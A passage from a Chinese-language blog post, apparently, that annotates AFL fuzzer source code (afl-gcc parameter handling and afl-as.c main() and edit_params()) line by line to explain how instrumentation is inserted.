class="string">&quot;    set AFL_CC or AFL_CXX to specify the correct path to that compiler.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">      FATAL(<span class="string">&quot;AFL_CC or AFL_CXX required on MacOS X&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span><span class="comment">// 不是apple系统</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-g++&quot;</span>)) &#123;<span class="comment">// 如果是afl-g++</span></span><br><span class="line">      u8* alt_cxx = getenv(<span class="string">&quot;AFL_CXX&quot;</span>);<span class="comment">// 获取环境变量AFL_CXX</span></span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="string">&quot;g++&quot;</span>;<span class="comment">// 如果AFL_CXX存在则直接将环境变量赋值给cc_params[0]，否则使用g++</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-gcj&quot;</span>)) &#123;<span class="comment">// 如果是afl-gcj</span></span><br><span class="line">      u8* alt_cc = getenv(<span class="string">&quot;AFL_GCJ&quot;</span>);<span class="comment">// 获取环境变量AFL_GCJ</span></span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;gcj&quot;</span>;<span class="comment">// 如果AFL_GCJ存在则直接将环境变量赋值给cc_params[0]，否则使用gcj</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">// 其他情况</span></span><br><span class="line">      u8* alt_cc = getenv(<span class="string">&quot;AFL_CC&quot;</span>);<span class="comment">// 获取环境变量AFL_CC</span></span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;gcc&quot;</span>;<span class="comment">// 如果AFL_CC存在则直接将环境变量赋值给cc_params[0]，否则使用gcc</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (--argc) &#123;<span class="comment">//循环遍历参数“清洗”和“分析”用户输入的编译参数，参考：共有5个部分 (afl-gcc, -O3, -o, my_app, my_app.c)，所以 argc = 5</span></span><br><span class="line">    u8* cur = *(++argv);<span class="comment">//获取参数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(cur, <span class="string">&quot;-B&quot;</span>, <span class="number">2</span>)) &#123;<span class="comment">//如果当前参数为 -B</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!be_quiet) WARNF(<span class="string">&quot;-B is already set, overriding&quot;</span>);<span class="comment">//判断静默模式是否关闭，如果关闭提示 -B 参数已经被设置</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!cur[<span class="number">2</span>] &amp;&amp; argc &gt; <span class="number">1</span>) &#123; argc--; argv++; &#125;<span class="comment">// ... 跳过 -B 和它可能附带的路径 ...</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-integrated-as&quot;</span>)) <span class="keyword">continue</span>;<span class="comment">// 当前参数为 -integrated-as，则跳过本次循环</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-pipe&quot;</span>)) <span class="keyword">continue</span>;<span class="comment">// 当前参数为 -pipe，则跳过本次循环</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)<span class="comment">//判断是否是FreeBSD系统或者x86_64系统上</span></span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-m32&quot;</span>)) m32_set = <span class="number">1</span>;<span class="comment">// 如果当前参数为 -m32，则设置m32_set为1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=address&quot;</span>) ||</span><br><span class="line">        !<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=memory&quot;</span>)) asan_set = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(cur, <span class="string">&quot;FORTIFY_SOURCE&quot;</span>)) fortify_set = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = cur;<span class="comment">//给cc_params赋值，cc_par_cnt全局变量初始值为1</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  cc_params[cc_par_cnt++] = <span class="string">&quot;-B&quot;</span>;</span><br><span class="line">  cc_params[cc_par_cnt++] = as_path;<span class="comment">//取出find_as函数中找到的as_path路径，组成 -B as_path</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (clang_mode)<span class="comment">// 如果clang模式是1</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-no-integrated-as&quot;</span>;<span class="comment">//赋值cc_params追加参数 -no-integrated-as</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_HARDEN&quot;</span>)) &#123;<span class="comment">// 获取环境变量AFL_HARDEN，存在进入分支</span></span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fstack-protector-all&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fortify_set)<span class="comment">//检查是否已经设置了fortify参数，如果没有，进入分支</span></span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-D_FORTIFY_SOURCE=2&quot;</span>;<span class="comment">//cc_params追加参数 -D_FORTIFY_SOURCE=2</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (asan_set) &#123;<span class="comment">//判断是否检查内存，如果已经设置为1(第一次修改line-208)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Pass this on to afl-as to adjust map density. */</span></span><br><span class="line"></span><br><span class="line">    setenv(<span class="string">&quot;AFL_USE_ASAN&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);<span class="comment">// 设置环境变量AFL_USE_ASAN为1</span></span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_USE_ASAN&quot;</span>)) &#123;<span class="comment">// 获取环境变量AFL_USE_ASAN(已经被设置为1)，存在进入分支</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_USE_MSAN&quot;</span>))<span class="comment">// 获取环境变量AFL_USE_MSAN，存在报错退出</span></span><br><span class="line">      FATAL(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);<span class="comment">//提示ASAN和MSAN互斥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_HARDEN&quot;</span>))<span class="comment">// 获取环境变量AFL_HARDEN，存在则进入分支</span></span><br><span class="line">      FATAL(<span class="string">&quot;ASAN and AFL_HARDEN are mutually exclusive&quot;</span>);<span class="comment">//提示ASAN和AFL_HARDEN互斥</span></span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=address&quot;</span>;<span class="comment">//如果上述两个环境变量都没有设置，则cc_params追加参数 -fsanitize=address</span></span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;<span class="comment">// 获取环境变量AFL_USE_MSAN，存在进入分支</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_USE_ASAN&quot;</span>))<span class="comment">// 获取环境变量AFL_USE_ASAN，存在报错退出</span></span><br><span class="line">      FATAL(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);<span class="comment">//提示ASAN和MSAN互斥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_HARDEN&quot;</span>))<span class="comment">// 获取环境变量AFL_HARDEN，存在则进入分支</span></span><br><span class="line">      FATAL(<span class="string">&quot;MSAN and AFL_HARDEN are mutually exclusive&quot;</span>);<span class="comment">//提示MSAN和AFL_HARDEN互斥</span></span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=memory&quot;</span>;<span class="comment">//如果上述两个环境变量都没有设置，则cc_params追加参数 -fsanitize=memory</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!getenv(<span class="string">&quot;AFL_DONT_OPTIMIZE&quot;</span>)) &#123;<span class="comment">// 获取环境变量AFL_DONT_OPTIMIZE，失败则进入分支</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)<span class="comment">//如果是FreeBSD系统或者x86_64系统，进入分支</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* On 64-bit FreeBSD systems, clang -g -m32 is broken, but -m32 itself</span></span><br><span class="line"><span class="comment">       works OK. This has nothing to do with us, but let&#x27;s avoid triggering</span></span><br><span class="line"><span class="comment">       that bug. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!clang_mode || !m32_set)<span class="comment">// 如果没有设置clang模式或者没有设置-m32参数，进入分支</span></span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span><span class="comment">// 不是FreeBSD系统或者x86_64系统</span></span></span><br><span class="line"></span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;<span class="comment">// cc_params追加参数 -g</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-O3&quot;</span>;<span class="comment">// cc_params追加参数 -O3</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-funroll-loops&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Two indicators that you&#x27;re building for fuzzing; one of them is</span></span><br><span class="line"><span class="comment">       AFL-specific, the other is shared with libfuzzer. */</span></span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-D__AFL_COMPILER=1&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1&quot;</span>;<span class="comment">// cc_params追加参数 -D__AFL_COMPILER=1和 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_NO_BUILTIN&quot;</span>)) &#123;<span class="comment">//如果设置了AFL_NO_BUILTIN环境变量，进入分支</span></span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-memcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strstr&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasestr&quot;</span>;<span class="comment">// cc_params追加参数 -fno-builtin-*</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  cc_params[cc_par_cnt] = <span class="literal">NULL</span>;<span class="comment">// cc_params最后一个参数设置为NULL，表示数组结束</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="afl-as-c"><a href="#afl-as-c" class="headerlink" title="afl-as.c"></a>afl-as.c</h2><p>afl-as.c 是 AFL 实现插桩的核心部分，代码相对复杂一些。它的目标是在汇编代码中插入“探针”，也就是桩代码，用于追踪程序的执行路径。</p>
<p>首先，要记住 afl-as 的根本任务是什么。它是一个“中间人”，站在编译器 (gcc) 和真正的汇编器 (as) 之间，它的使命是：<br><strong>在不破坏原有汇编代码逻辑的前提下，悄悄地在代码中植入用于路径覆盖率跟踪的“探针”（桩代码）。</strong></p>
<p>阅读 afl-as.c 的核心目的：<strong>搞清楚 AFL 是如何识别插桩点，以及它到底插入了什么样的代码来实现路径跟踪的。</strong></p>
<blockquote>
<p>带着以下几个具体问题去阅读：</p>
<ul>
<li>main 函数是如何处理输入和输出文件的？它如何调用真正的 as？</li>
<li>**（核心中的核心）**add_instrumentation() 函数是如何工作的？</li>
<li>它是如何一行行读取汇编代码的？</li>
<li>它是通过哪些特征（比如标签 L…:、函数开头 .LFB…）来判断“这是一个基本块的开始，我应该在这里插桩”的？</li>
<li>插桩时，cur_location &#x3D; R(MAP_SIZE) 这行代码的作用是什么？（提示：它为每个桩点分配一个随机ID）。这个ID和AFL的共享内存 (shared_mem) 有什么关系？</li>
<li>AFL 到底插入了什么汇编代码？这些代码定义在哪里？（提示：寻找 #include “afl-as.h”，然后去阅读 afl-as.h 文件中的 TRAMPOLINE 宏定义）。</li>
<li>插入的桩代码（trampoline）是如何调用 __afl_maybe_log 这个C函数的？这个函数的作用是什么？</li>
</ul>
<p>我在阅读工程中需要注意哪些重点:</p>
<ul>
<li><strong>main 函数中的 fork() &#x2F; execvp() 模式</strong>：理解 afl-as 如何通过创建子进程来调用真正的 as，而父进程则负责处理汇编代码的修改。</li>
<li><strong>add_instrumentation() 函数</strong>：这是你 90% 的精力应该投入的地方。</li>
<li><strong>状态机思想</strong>: 注意代码中 instr_ok、skip_instr 这些标志位，它们构成了一个简单的状态机，用于判断当前行是否适合插桩。</li>
<li><strong>识别逻辑</strong>: 重点关注对 line 缓冲区的字符串比较，例如 strncmp(line, “.L”, 2)、strstr(line, “call”) 等。这些是识别插桩点的关键。</li>
<li><strong>桩代码模板</strong>: 必须打开 afl-as.h 文件，对照 fprintf(outf, …) 和 TRAMPOLINE 宏来看。你需要理解桩代码的通用流程：“保存寄存器 -&gt; 计算共享内存地址 -&gt; 更新计数值 -&gt; 恢复寄存器”。</li>
<li><strong>__afl_maybe_log 函数</strong>：虽然这个函数的实现在 afl-rt.c 中，但你要在 afl-as.c 的阅读中建立起一个概念：桩代码最终会调用这个函数，这个函数是插桩代码与 afl-fuzz 主进程进行通信的桥梁。</li>
</ul>
</blockquote>
<h3 id="main-函数-1"><a href="#main-函数-1" class="headerlink" title="main()函数"></a>main()函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Main entry point */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line"></span><br><span class="line">  s32 pid;</span><br><span class="line">  u32 rand_seed;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  u8* inst_ratio_str = getenv(<span class="string">&quot;AFL_INST_RATIO&quot;</span>);<span class="comment">// 该环境变量主要检测每个分支的概率，取值为0到100%，设置为0时只检测函数入口的跳转，而不会检测函数分支的跳转</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timezone</span> <span class="title">tz</span>;</span></span><br><span class="line"></span><br><span class="line">  clang_mode = !!getenv(CLANG_ENV_VAR);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isatty(<span class="number">2</span>) &amp;&amp; !getenv(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(cCYA <span class="string">&quot;afl-as &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It is a wrapper around GNU &#x27;as&#x27;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;executed by the toolchain whenever using afl-gcc or afl-clang. You probably\n&quot;</span></span><br><span class="line">         <span class="string">&quot;don&#x27;t want to run this program directly.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;Rarely, when dealing with extremely complex projects, it may be advisable to\n&quot;</span></span><br><span class="line">         <span class="string">&quot;set AFL_INST_RATIO to a value less than 100 in order to reduce the odds of\n&quot;</span></span><br><span class="line">         <span class="string">&quot;instrumenting every discovered branch.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gettimeofday(&amp;tv, &amp;tz);<span class="comment">//获取当前精确时间</span></span><br><span class="line"></span><br><span class="line">  rand_seed = tv.tv_sec ^ tv.tv_usec ^ getpid();<span class="comment">//通过当前时间与进程pid进行异或处理</span></span><br><span class="line"></span><br><span class="line">  srandom(rand_seed);<span class="comment">//获得随机化种子</span></span><br><span class="line"></span><br><span class="line">  edit_params(argc, argv);<span class="comment">//检查并修改参数传递给as。文件名是以gcc传递的最后一个参数为准，此函数主要设置变量as_params的值，以及use_64bit/modified_file的值</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (inst_ratio_str) &#123;<span class="comment">//如果环境变量AFL_INST_RATIO存在则进入该分支</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf</span>(inst_ratio_str, <span class="string">&quot;%u&quot;</span>, &amp;inst_ratio) != <span class="number">1</span> || inst_ratio &gt; <span class="number">100</span>) <span class="comment">//如果没有将覆盖率写入inst_ratio变量或者inst_ratio中的值超过100的话，则进入分支抛出异常</span></span><br><span class="line">      FATAL(<span class="string">&quot;Bad value of AFL_INST_RATIO (must be between 0 and 100)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (getenv(AS_LOOP_ENV_VAR))<span class="comment">//如果环境变量AS_LOOP_ENV_VAR存在则进入该分支</span></span><br><span class="line">    FATAL(<span class="string">&quot;Endless loop when calling &#x27;as&#x27; (remove &#x27;.&#x27; from your PATH)&quot;</span>);<span class="comment">//抛出异常</span></span><br><span class="line"></span><br><span class="line">  setenv(AS_LOOP_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);<span class="comment">//设置环境变量AS_LOOP_ENV_VAR的值为1</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When compiling with ASAN, we don&#x27;t have a particularly elegant way to skip</span></span><br><span class="line"><span class="comment">     ASAN-specific branches. But we can probabilistically compensate for</span></span><br><span class="line"><span class="comment">     that... */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_USE_ASAN&quot;</span>) || getenv(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;<span class="comment">//如果环境变量AFL_USE_ASAN或者AFL_USE_MSAN存在则进入该分支</span></span><br><span class="line">    sanitizer = <span class="number">1</span>;<span class="comment">//设置变量sanitizer的值为1</span></span><br><span class="line">    inst_ratio /= <span class="number">3</span>;<span class="comment">//将inst_ratio的值除以3</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!just_version) add_instrumentation();<span class="comment">//如果不是只查询version，那么就会进入add_instrumentation函数，该函数主要处理输入文件，生成modified_file，将桩插入适当的位置</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(pid = fork())) &#123;<span class="comment">//调用fork()创建子进程。在执行execvp()函数执行时</span></span><br><span class="line"></span><br><span class="line">    execvp(as_params[<span class="number">0</span>], (<span class="type">char</span>**)as_params);<span class="comment">//执行命令和参数</span></span><br><span class="line">    FATAL(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, as_params[<span class="number">0</span>]);<span class="comment">//不成功抛出异常</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;fork() failed&quot;</span>);<span class="comment">//如果创建子进程失败，抛出异常</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (waitpid(pid, &amp;status, <span class="number">0</span>) &lt;= <span class="number">0</span>) PFATAL(<span class="string">&quot;waitpid() failed&quot;</span>);<span class="comment">//等待子进程结束</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!getenv(<span class="string">&quot;AFL_KEEP_ASSEMBLY&quot;</span>)) unlink(modified_file);<span class="comment">//读取环境变量AFL_KEEP_ASSEMBLY失败，则unlink掉modified_file文件</span></span><br><span class="line">  <span class="comment">//设置该环境变量主要是为了防止afl-as删掉插桩后的汇编文件，设置为1插桩文件</span></span><br><span class="line">  <span class="built_in">exit</span>(WEXITSTATUS(status));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="edit-params-函数-1"><a href="#edit-params-函数-1" class="headerlink" title="edit_params()函数"></a>edit_params()函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Examine and modify parameters to pass to &#x27;as&#x27;. Note that the file name</span></span><br><span class="line"><span class="comment">   is always the last parameter passed by GCC, so we exploit this property</span></span><br><span class="line"><span class="comment">   to keep the code simple. */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">edit_params</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;<span class="comment">//假设参数[as, --64, -o, test.o, /tmp/test.s]</span></span><br><span class="line"></span><br><span class="line">  u8 *tmp_dir = getenv(<span class="string">&quot;TMPDIR&quot;</span>), *afl_as = getenv(<span class="string">&quot;AFL_AS&quot;</span>);<span class="comment">//获取环境变量TMPDIR和AFL_AS的值</span></span><br><span class="line">  u32 i;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__<span class="comment">//如果是苹果系统</span></span></span><br><span class="line"></span><br><span class="line">  u8 use_clang_as = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* On MacOS X, the Xcode cctool &#x27;as&#x27; driver is a bit stale and does not work</span></span><br><span class="line"><span class="comment">     with the code generated by newer versions of clang that are hand-built</span></span><br><span class="line"><span class="comment">     by the user. See the thread here: http://goo.gl/HBWDtn.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     To work around this, when using clang and running without AFL_AS</span></span><br><span class="line"><span class="comment">     specified, we will actually call &#x27;clang -c&#x27; instead of &#x27;as -q&#x27; to</span></span><br><span class="line"><span class="comment">     compile the assembly file.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The tools aren&#x27;t cmdline-compatible, but at least for now, we can</span></span><br><span class="line"><span class="comment">     seemingly get away with this by making only very minor tweaks. Thanks</span></span><br><span class="line"><span class="comment">     to Nico Weber for the idea. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (clang_mode &amp;&amp; !afl_as) &#123;<span class="comment">//如果是clang模式并且环境变量AFL_AS不存在 则进入该分支</span></span><br><span class="line"></span><br><span class="line">    use_clang_as = <span class="number">1</span>;<span class="comment">//设置变量use_clang_as的值为1</span></span><br><span class="line"></span><br><span class="line">    afl_as = getenv(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!afl_as) afl_as = getenv(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!afl_as) afl_as = <span class="string">&quot;clang&quot;</span>;<span class="comment">//将afl_as赋值为AFL_CC、AFL_CXX或者clang中的一种</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Although this is not documented, GCC also uses TEMP and TMP when TMPDIR</span></span><br><span class="line"><span class="comment">     is not set. We need to check these non-standard variables to properly</span></span><br><span class="line"><span class="comment">     handle the pass_thru logic later on. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = getenv(<span class="string">&quot;TEMP&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = getenv(<span class="string">&quot;TMP&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = <span class="string">&quot;/tmp&quot;</span>;<span class="comment">//为tmp_dir赋值为环境变量TMPDIR、TEMP、TMP或者/tmp中的一种</span></span><br><span class="line"></span><br><span class="line">  as_params = ck_alloc((argc + <span class="number">32</span>) * <span class="keyword">sizeof</span>(u8*));<span class="comment">//为as_params分配内存</span></span><br><span class="line"></span><br><span class="line">  as_params[<span class="number">0</span>] = afl_as ? afl_as : (u8*)<span class="string">&quot;as&quot;</span>;<span class="comment">//为as_params[0]赋值为环境变量AFL_AS的值或者as</span></span><br><span class="line"></span><br><span class="line">  as_params[argc] = <span class="number">0</span>;<span class="comment">//设置最后一个参数为0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; argc - <span class="number">1</span>; i++) &#123;<span class="comment">//从第二个参数开始遍历，也就是--64，argc = 5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--64&quot;</span>)) use_64bit = <span class="number">1</span>;<span class="comment">//如果遍历到--64则将use_64bit设置为1</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--32&quot;</span>)) use_64bit = <span class="number">0</span>;<span class="comment">//如果遍历到--32则将use_64bit设置为0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The Apple case is a bit different... */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-arch&quot;</span>) &amp;&amp; i + <span class="number">1</span> &lt; argc) &#123;<span class="comment">//如果遍历到-arch并且i+1小于argc则进入该分支</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i + <span class="number">1</span>], <span class="string">&quot;x86_64&quot;</span>)) use_64bit = <span class="number">1</span>;<span class="comment">//如果是-arch x86_64则将use_64bit设置为1</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i + <span class="number">1</span>], <span class="string">&quot;i386&quot;</span>))<span class="comment">//如果是-arch i386则报错</span></span><br><span class="line">        FATAL(<span class="string">&quot;Sorry, 32-bit Apple platforms are not supported.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Strip options that set the preference for a particular upstream</span></span><br><span class="line"><span class="comment">       assembler in Xcode. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clang_mode &amp;&amp; (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-q&quot;</span>) || !<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-Q&quot;</span>)))</span><br><span class="line">      <span class="keyword">continue</span>;<span class="comment">//如果是clang模式并且遍历到-q或者-Q则跳过该参数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">    as_params[as_par_cnt++] = argv[i];<span class="comment">//[as, --64, -o, test.o]</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> 